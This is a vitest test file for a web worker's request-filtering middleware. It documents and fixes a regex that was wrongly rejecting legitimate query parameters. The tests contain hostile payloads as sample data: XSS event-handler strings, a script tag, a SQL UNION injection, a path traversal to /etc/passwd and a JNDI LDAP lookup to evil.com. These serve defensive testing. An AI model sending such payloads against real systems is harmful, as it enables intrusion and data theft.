/* Found live, while post-merge-verifying PR #168 (CAP-CRM-007) against real
 * production: GET https://cyberdudebivash-security-hub.iambivash-bn.workers.dev
 * /api/conversion/triggers?session_id=<anything> returned a raw
 * {"error":"Bad request"} 400 (0ms response time — rejected before routing
 * even ran), despite session_id being exactly the query param
 * handleGetTriggers itself reads. GET .../api/conversion/cta?context=general
 * 400'd identically, on a route/param this session never touched — proving
 * this is a pre-existing, unrelated bug, not a regression from PR #168.
 *
 * ROOT CAUSE: workers/src/middleware/security.js's BLOCKED_PATTERNS included
 * the bare regex /on\w{2,20}\s*=/i (intended to catch inline HTML
 * event-handler XSS: onerror=, onload=, onclick=), applied to
 * `url.pathname + url.search` on every single request before routing. With
 * no word-boundary anchor, it also matches "on" appearing *inside* any
 * legitimate identifier followed by 2-20 word chars and "=" — e.g.
 * "sessi-ON_id=" and "c-ON-text=" both satisfy it. A repo-wide scan of every
 * `searchParams.get(...)` call found 5 real, live query params that
 * false-positive trip it: session_id, context, component, min_confidence,
 * month — used by conversionTriggers.js, revenue.js, aiSecurityCopilot.js,
 * eop/uptime.js, threatFusionEngine.js, and enterpriseTransformHandler.js.
 * Any real request to any of those routes with that param has been silently
 * 400ing, for every caller, since this pattern shipped — a separate,
 * previously-undiscovered production defect, unrelated to and not
 * introduced by PR #168.
 *
 * FIX: anchor the pattern to a real word boundary (`\bon\w{2,20}\s*=`). A
 * genuine inline-event-handler injection is always preceded by whitespace,
 * a quote, or a tag boundary — never by a word character — so this loses no
 * real attack coverage while eliminating the false positive.
 */
import { describe, it, expect } from 'vitest';
import { DatabaseSync } from 'node:sqlite';
import { inspectForAttacks } from '../src/middleware/security.js';
import worker from '../src/index.js';

describe('inspectForAttacks() — onXX= pattern no longer false-positives on real identifiers', () => {
  it('the 5 real, live query params found by a repo-wide scan no longer trip it', () => {
    for (const qs of ['session_id=abc123', 'context=general', 'component=uptime', 'min_confidence=50', 'month=2026-07']) {
      expect(inspectForAttacks(`/api/x?${qs}`)).toBe(false);
    }
  });

  it('still blocks a real inline event-handler injection in the realistic contexts an attacker uses', () => {
    expect(inspectForAttacks('/api/x?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E')).toBe(true);
    expect(inspectForAttacks('/api/x?q=<svg onload=alert(1)>')).toBe(true);
    expect(inspectForAttacks('/api/x?q= onclick=alert(1)')).toBe(true);
    expect(inspectForAttacks("/api/x?q='onmouseover=alert(1)")).toBe(true);
  });

  it('other BLOCKED_PATTERNS entries are unaffected by this change (still real attacks, still blocked)', () => {
    expect(inspectForAttacks('/api/x?q=<script>alert(1)</script>')).toBe(true);
    expect(inspectForAttacks('/api/x?q=1 UNION SELECT * FROM users')).toBe(true);
    expect(inspectForAttacks('/api/x?path=../../etc/passwd')).toBe(true);
    expect(inspectForAttacks('/api/x?q=${jndi:ldap://evil.com/a}')).toBe(true);
  });

  it('an identifier-like payload with no real word boundary before "on" is not a valid HTML attribute anyway, so excluding it costs nothing', () => {
    // "xonerror=" is not a browser-recognized event handler (attribute names
    // must match exactly) — this pattern was never the thing stopping it
    // from being a real attack vector, since it isn't one. (Using a
    // parenthesis-free payload here so this test isolates only the onXX=
    // pattern under test, not the separate LDAP-char rule that "alert(1)"
    // would also legitimately trip.)
    expect(inspectForAttacks('/api/x?q=xonerror=1')).toBe(false);
  });
});

function makeKV() {
  const store = new Map();
  return {
    async get(k, opts) { const v = store.get(k); if (v === undefined) return null; return opts?.type === 'json' ? JSON.parse(v) : v; },
    async put(k, v) { store.set(k, String(v)); },
  };
}
function makeD1() {
  const sqlite = new DatabaseSync(':memory:');
  const wrap = (sql) => { let b = []; return {
    bind(...a) { b = a; return this; },
    async all() { return { results: sqlite.prepare(sql).all(...b) }; },
    async first() { return sqlite.prepare(sql).get(...b) ?? null; },
    async run() { const i = sqlite.prepare(sql).run(...b); return { meta: { changes: i.changes } }; },
  }; };
  return { prepare: wrap };
}
const ctxStub = { waitUntil: () => {}, passThroughOnException: () => {} };

describe('Full pipeline (real router) — the 5 previously-broken live routes now respond for real, not with the raw WAF 400', () => {
  it('GET /api/conversion/triggers?session_id=... (this session\'s own CAP-CRM-007 fix) no longer 400s at the WAF layer', async () => {
    const env = { DB: makeD1(), SECURITY_HUB_KV: makeKV() };
    const res = await worker.fetch(new Request('https://x/api/conversion/triggers?session_id=visitor-42'), env, ctxStub);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.data.active_triggers).toBeDefined();
  });

  it('GET /api/conversion/cta?context=... no longer 400s at the WAF layer (a route this session never touched — proves the bug was pre-existing)', async () => {
    const env = { DB: makeD1(), SECURITY_HUB_KV: makeKV() };
    const res = await worker.fetch(new Request('https://x/api/conversion/cta?plan=FREE&context=after_scan'), env, ctxStub);
    expect(res.status).toBe(200);
  });

  it('a genuine attack query string is still rejected end-to-end with the WAF 400, unaffected by this fix', async () => {
    const env = { DB: makeD1(), SECURITY_HUB_KV: makeKV() };
    const res = await worker.fetch(new Request('https://x/api/conversion/cta?q=%3Csvg%20onload=alert(1)%3E'), env, ctxStub);
    expect(res.status).toBe(400);
    const body = await res.json();
    expect(body.error).toBe('Bad request');
  });
});
